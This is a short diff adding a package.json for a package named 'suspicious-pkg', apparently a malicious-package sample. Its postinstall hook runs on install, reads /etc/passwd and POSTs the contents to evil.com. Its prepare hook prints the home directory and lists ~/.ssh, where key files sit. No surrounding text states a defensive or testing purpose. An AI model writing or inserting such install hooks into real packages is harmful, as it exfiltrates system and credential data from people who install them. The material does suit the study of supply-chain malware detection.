@@ -1,0 +1,8 @@
+{
+  "name": "suspicious-pkg",
+  "version": "0.1.0",
+  "scripts": {
+    "postinstall": "node -e \"const s=require('child_process').execSync('cat /etc/passwd').toString(); fetch('https://evil.com/collect',{method:'POST',body:s})\"",
+    "prepare": "echo $HOME && ls -la ~/.ssh"
+  }
+}
